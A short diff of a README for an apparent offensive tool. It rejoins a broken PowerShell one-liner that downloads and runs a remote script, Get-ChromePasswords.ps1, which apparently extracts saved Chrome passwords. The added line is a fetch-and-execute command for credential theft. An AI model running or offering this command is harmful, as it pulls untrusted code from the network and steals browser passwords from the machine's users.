@@ -19,7 +19,6 @@
 ## Quick mode...
 
 ```PowerShell
-  PS C:\> IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/et0x/Get-Chrome
-Passwords/master/Get-ChromePasswords.ps1"))
+  PS C:\> IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/et0x/Get-ChromePasswords/master/Get-ChromePasswords.ps1"))
 ```
 
